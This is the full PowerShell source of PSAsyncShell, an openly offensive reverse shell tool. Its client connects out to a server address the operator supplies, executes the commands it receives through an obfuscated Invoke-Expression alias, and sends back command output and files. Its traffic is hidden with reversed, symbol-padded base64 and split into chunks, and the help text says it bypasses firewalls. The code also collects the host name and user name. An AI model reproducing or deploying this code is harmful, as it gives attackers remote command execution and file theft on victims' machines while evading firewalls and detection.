#==============================#
#  PSAsyncShell by @JoelGMSec  #
#     https://darkbyte.net     #
#==============================#

# Design
Set-StrictMode -Off
$ProgressPreference = "SilentlyContinue"
$ErrorActionPreference = "SilentlyContinue"
$OSVersion = [Environment]::OSVersion.Platform
if ($OSVersion -like "*Win*"){ if ($args[0] -like "-s"){
$Host.UI.RawUI.WindowTitle = "PSAsyncShell - by @JoelGMSec" 
$Host.UI.RawUI.BackgroundColor = "Black"
$Host.UI.RawUI.ForegroundColor = "White" }}

# Banner
function Show-Banner {
Write-Host
Write-Host "  ____  ____    _                         ____  _          _ _  " -ForegroundColor Blue
Write-Host " |  _ \/ ___|  / \   ___ _   _ _ __   ___/ ___|| |__   ___| | | " -ForegroundColor Blue
Write-Host " | |_) \___ \ / _ \ / __| | | | '_ \ / __\___ \| '_ \ / _ \ | | " -ForegroundColor Blue
Write-Host " |  __/ ___) / ___ \\__ \ |_| | | | | (__ ___) | | | |  __/ | | " -ForegroundColor Blue
Write-Host " |_|   |____/_/   \_\___/\__, |_| |_|\___|____/|_| |_|\___|_|_| " -ForegroundColor Blue
Write-Host "                         |___/                                  " -ForegroundColor Blue
Write-Host
Write-Host "  ---------------------- by @JoelGMSec -----------------------  " -ForegroundColor Green
Write-Host }

# Help
function Show-Help {
Write-Host " Info: " -ForegroundColor Yellow -NoNewLine ; Write-Host " This tool helps you to get a remote shell"
Write-Host "        over asynchronous TCP to bypass firewalls"
Write-Host ; Write-Host " Usage: " -ForegroundColor Yellow -NoNewLine ; Write-Host ".\PSAsyncShell.ps1 -s -p listen_port" -ForegroundColor Blue 
Write-Host "          Listen for a new connection from the client" -ForegroundColor Green
Write-Host ; Write-Host "        .\PSAsyncShell.ps1 -c server_ip server_port" -ForegroundColor Blue 
Write-Host "          Connect the client to a PSAsyncShell server" -ForegroundColor Green
Write-Host ; Write-Host " Warning: " -ForegroundColor Red -NoNewLine  ; Write-Host "All info betwen parts will be sent unencrypted"
Write-Host "          Download & Upload functions don't use MultiPart"
Write-Host }

# Errors
if ($args[0] -like "-h*"){ Show-Banner ; Show-Help ; break }
if ($args[2] -eq $null){ Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }

# Variables
$IP = $args[1]
$Port = $args[2]
$Start = "True"
$Chunk = $args[4]
$DataCount = 1
$remotepath = $home
$Alias1 = "Invoke" ; $Alias2 = "Express"
Set-Alias sh -value "$Alias1-$Alias2`ion"
if ($args -like "*-debug") { $debug = "True" }
if ($OSVersion -like "*Win*"){ $localslash = "\" } else { $localslash = "/" } 
$symbols = '.........".$.}.{.>.<.*.%.;.:./.\.(.).@.~.=.].[.!.?.^.&.#.|.........'

# Functions
function GetChunk {
$text = $args[0] ; $i = 0
while ($i -le ($text.length-$Chunk)){ $text.Substring($i,$Chunk) ; $i += $Chunk }
$text.Substring($i)}

function SendChunk {
try { $writer.WriteLine($args[0])
$writer.Close() ; $tcpConnection.Close()}
catch { $tcpConnection = New-Object System.Net.Sockets.TcpClient("$IP", "$Port")
if ($debug -eq "True"){ $chunkdata = $(ReplaceSymbols $args[0])
$chunkdata = $chunkdata.Replace(",", "") ; Write-Host "MULTIOUT: $chunkdata" }
$tcpStream = $tcpConnection.GetStream() ; Start-Sleep -milliseconds 500
$writer = New-Object System.IO.StreamWriter($tcpStream)
$writer.WriteLine($args[0])
$writer.Close() ; $tcpConnection.Close()}}

function R64Encoder {
if ($args[0] -eq "-t"){ $base64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($args[1]))}
if ($args[0] -eq "-f"){ $base64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($args[1]))}
$base64 = $base64.Split("=")[0] ; $base64 = $base64.Replace("+", "-") ; $base64 = $base64.Replace("/", "_")
$revb64 = $base64.ToCharArray() ; [array]::Reverse($revb64) ; $R64Base = -join $revb64
$Rand64 = (($R64Base -split "(.{$(Get-Random(2..3))})" -ne "" | % { 
$randomIndex = Get-Random -Minimum 0 -Maximum ($symbols.Length) ; Write-Output $("." * $(Get-Random -Minimum 1 -Maximum 7))
$symbols[$randomIndex] + $_ + $($randomIndex = Get-Random -Minimum 0 -Maximum ($symbols.Length)
$symbols[$randomIndex])}) -join "").toString() ; return $Rand64 }

function ReplaceSymbols($text){
$symbols.ToCharArray() | ForEach-Object {
$text = $text.Replace("$_", ",")} ; $text }

function R64Decoder {
$base64 = $args[1].ToCharArray() ; [array]::Reverse($base64) ; $base64 = -join $base64
$base64 = ReplaceSymbols $base64 ; $base64 = [string]$base64.Replace(",", "")
$base64 = [string]$base64.Replace("-", "+") ; $base64 = [string]$base64.Replace("_", "/")
switch ($base64.Length % 4){ 0 { break } ; 2 { $base64 += "=="; break } ; 3 { $base64 += "="; break }}
if ($args[0] -eq "-t"){ $revb64 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64)) ; $revb64 }
if ($args[0] -eq "-f"){ $revb64 = [System.Convert]::FromBase64String($base64) ; [System.IO.File]::WriteAllBytes($args[2], $revb64)}}

# ------------ Server Side ------------ #
if ($args[0] -like "-s"){ Show-Banner ; Write-Host "[+] Waiting for new connection..`n" -ForegroundColor Yellow
$endpoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::any, "$Port")
$Listener = New-Object System.Net.Sockets.TcpListener $endpoint

# Read command & Send to client
while ($true){ $Listener.Start()
$client = $Listener.AcceptTcpClient()
$stream = $client.GetStream()

if ($Start -eq "True"){ $command = R64Encoder -t "[+] PSAsyncShell OK!" }
elseif ($upload -eq "True"){ $command = R64Decoder -t $command
$downfile = $command.split()[1] ; $command = R64Encoder -f $downfile ; $upload = "False" }
elseif ($Multi -eq "True"){ $command = R64Encoder -t "[+] MultiPart Data OK!" }

else { do { $path = $path.replace("`n","").replace("`r","")
Write-Host -NoNewline "[PSAsyncShell] $path> " -ForegroundColor Blue ; $command = $Host.UI.ReadLine()
if ($command -like "session"){ $command = '$clientdata | Format-Table -AutoSize' }
if ($command -like "pwd"){ if (!$path){ $Start = "True" ; Write-Host }}

if ($command -like "upload*"){ $upload = "True" ; $upfile = $command.split()[2]
if ($command -notlike "*$remoteslash*"){ $command = "upload " + $command.split()[1] + " $path" + $remoteslash + $upfile }
if (!$upfile){ Write-Host "[!] Usage: upload local_file remote_file" -ForegroundColor Red ; $command = $null }}

if ($command -like "download*"){ $download = "True" ; $downfile = $command.split()[2]
if ($command -notlike "*$remoteslash*"){ $command = "download " + $path + $remoteslash + $command.split()[1] + " $downfile" }
if (!$downfile){ Write-Host "[!] Usage: download remote_file local_file" -ForegroundColor Red ; $command = $null }}

if ($command -like "cls"){ Clear-Host ; $command = $null }
if ($command -like "clear"){ Clear-Host ; $command = $null }
if ($command -like "cd ."){ $path = $path ; $command = $null }
if ($command -like "cd .."){ $path = Split-Path $path ; $command = "Set-Location $path" ; Write-Host }
if ($command -like "cd*"){ $remotepath = $command.split()[1..99] -join ' ' ; Write-Host
if ($command -like "*$remoteslash*"){ $command = "Set-Location `'$remotepath`'" ; $path = $remotepath }

else { $path = $path + $remoteslash + $command.split()[1..99] -join ' ' ; $command = "Set-Location `'$path`'" }}
if ($OSVersion -like "*Win*"){ if ($remoteslash -eq "/"){ $path = $path.replace("\","/")}}
if ($OSVersion -notlike "*Win*"){ if ($remoteslash -eq "\"){ $path = $path.replace("/","\")}}
if ($command -eq "exit"){ $PSexit = "True" } ; if ($command -eq $null){ Write-Host }}

until ($command -ne $null) ; if ($command){ $command = R64Encoder -t $command }}
if ($debug -eq "True"){ Write-Host "CMD: $command" }
$remotepath = $remotepath.replace("'","").replace('"','')

$stream.Write([text.Encoding]::Ascii.GetBytes($command), 0, $command.Length)
$client.Close() ; $Listener.Stop()

# Receive command output
Start-Sleep -milliseconds 500
if ($PSexit -eq "True"){ Write-Host "[!] Exiting!`n" -ForegroundColor Red ; exit }
$Listener.Start()
$client = $Listener.AcceptTcpClient()
$stream = $client.GetStream()
$reader = New-Object System.IO.StreamReader($stream)
$data = $reader.ReadLine()

if ($debug -eq "True"){ Write-Host "DATA: $data" }

if ($Start -eq "True"){ $path = R64Decoder -t $data ; $Start = "False"
$data = $null ; if ($path -like "*\*"){ $remoteslash = "\" } else { $remoteslash = "/" }}

elseif ($download -eq "True"){
if ($(R64Decoder -t $data) -eq "[+] Sending MultiPart Data.."){ $data = $null
Write-Host "[+] Receiving MultiPart Data" -ForegroundColor Yellow -NoNewline
$Multi = "True" ; $download = "False" ; $MultiDown = "True" }
else { R64Decoder -f $data $downfile
$data = "[+] File downloaded on $pwd$localslash$downfile!`n" ; $download = "False" }}

elseif ($Multi -eq "True"){ if ($(R64Decoder -t $data) -eq "[+] MultiPart Data OK!"){ 
if ($MultiDown -eq "True"){ $Multi = "False" ; $data = R64Decoder -f $multidata $downfile ; $MultiDown = "False"
$data = "[+] File downloaded on $pwd$localslash$downfile!`n" ; $DataCount = 1 ; $multidata = $null ; Write-Host "`n" }
else { $Multi = "False" ; $data = R64Decoder -t $multidata ; $multidata = $null ; Write-Host "`n" }}
else { $cursortop = [System.Console]::get_CursorTop() ; $multidata += $data ; $data = $null
Write-Host "." -ForegroundColor Yellow -NoNewline ; $DataCount++ ; if ($DataCount -eq 11){ $DataCount = 1
[Console]::SetCursorPosition(0,"$cursortop") ; Write-Host "                                          " -ForegroundColor Yellow -NoNewline
[Console]::SetCursorPosition(0,"$cursortop") ; Write-Host "[+] Receiving MultiPart Data.." -ForegroundColor Yellow -NoNewline }}}

else { if ($data -ne $null){ $data = R64Decoder -t $data }}

if (!$data){ if ($Multi -eq "False"){ Write-Host }}
if ($data -eq "[+] Ready to upload!"){ $data = $null }
if ($data -eq "[+] File uploaded!"){ $data = "[+] File uploaded on $path$remoteslash$upfile!`n" }
if ($data -eq "[+] Sending MultiPart Data.."){ $data = $null ; $Multi = "True"
Write-Host "[+] Receiving MultiPart Data.." -ForegroundColor Yellow -NoNewline }

if ($data -like '*[+]*'){ Write-Host $data -ForegroundColor Green }
else { if ($data){ Write-Host $data -ForegroundColor Yellow }}
$client.Close() ; $Listener.Stop()}}

# ------------ Client Side ------------ #
if ($args[0] -like "-c"){ while ($true){ $cmd = $null ; $out = $null
$ClientData = New-Object -TypeName psobject
$ClientData | Add-Member -MemberType NoteProperty -Name Current -Value "*"
$RandomID = (-join ((0x30..0x39)+(0x41..0x5A)+(0x61..0x7A) | Get-Random -Count 12  | % {[char]$_}))
$ClientData | Add-Member -MemberType NoteProperty -Name ClientID -Value $RandomID
$ClientData | Add-Member -MemberType NoteProperty -Name ComputerName -Value $([System.Environment]::MachineName.tolower())
$ClientData | Add-Member -MemberType NoteProperty -Name UserName -Value $([System.Environment]::UserName.tolower())

# Read command from server
Start-Sleep -milliseconds 500
$tcpConnection = New-Object System.Net.Sockets.TcpClient("$IP", "$Port")
$ClientData | Add-Member -MemberType NoteProperty -Name Address -Value $($tcpconnection.client.localendpoint.address.ipaddresstostring)
$tcpStream = $tcpConnection.GetStream()
$reader = New-Object System.IO.StreamReader($tcpStream)
$cmd = $reader.ReadLine()

if ($upload -eq "True"){ R64Decoder -f $cmd $downfile }
else { $cmd = R64Decoder -t $cmd }
if ($cmd -eq "[+] PSAsyncShell OK!"){ $Start = "True" }

if ($debug -eq "True"){ Write-Host "CMD: $cmd" }
$reader.Close() ; $tcpConnection.Close()

# Run command & Send to server
$tcpConnection = New-Object System.Net.Sockets.TcpClient("$IP", "$Port")
$tcpStream = $tcpConnection.GetStream()
$writer = New-Object System.IO.StreamWriter($tcpStream)
$writer.AutoFlush = $true

if ($cmd -like "download*"){ $out = R64Encoder -f $cmd.split()[1] }
elseif ($cmd -like "upload*"){ $downfile = $cmd.split()[2]
$out = R64Encoder -t "[+] Ready to upload!" ; $upload = "True" }

elseif ($upload -eq "True"){ $out = R64Encoder -t "[+] File uploaded!" ; $upload = "False" }
elseif ($Start -eq "True"){ $out = R64Encoder -t $pwd.Path ; $Start = "False" }
elseif ($Multi -eq "True"){ GetChunk $multiout | % { Start-Sleep 1.2 ; SendChunk $_ ; SendChunk $_ } ; $Multi = "SendOut" }
elseif ($Multi -eq "SendOut"){ $out = R64Encoder -t "[+] MultiPart Data OK!" ; $Multi = "False" ; $multiout = $null }

else { $out = $(sh "$cmd") | Out-String
if ($out -ne $null){ $out = R64Encoder -t $out } else { $out = R64Encoder -t $pwd.Path }}

if ($Chunk){ if ($out.length -ge $Chunk){ $multiout = $out ; $Multi = "True"
$out = R64Encoder -t "[+] Sending MultiPart Data.." }}
if ($debug -eq "True"){ if ($Multi -ne "True"){ Write-Host "OUT: $(R64Decoder -t $out)" }}

$writer.WriteLine($out)
$writer.Close() ; $tcpConnection.Close()}}
